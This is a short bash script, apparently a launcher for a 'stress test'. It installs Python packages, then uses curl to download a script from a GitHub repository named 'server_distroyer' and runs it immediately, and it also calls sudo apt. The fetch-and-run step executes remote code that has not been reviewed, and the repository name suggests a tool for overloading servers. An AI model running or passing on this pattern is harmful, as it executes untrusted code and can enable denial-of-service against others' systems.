#!/bin/bash

# Simple stress test runner

echo "🔥 Installing requirements..."
pip3 install numpy
pip3 install requests aiohttp

# Delete the file if it exists
if [ -f "stress_test.py" ]; then
    echo "🧹 Removing old script..."
    rm stress_test.py
fi

# Download the script
echo "📥 Downloading script..."
curl -s -L "https://raw.githubusercontent.com/blackangiliq/server_distroyer/main/linux_load_test.py" -o stress_test.py

# Install system dependency
sudo apt install -y libgcc1

# Run the script
echo "🚀 Starting stress test..."
python3 stress_test.py
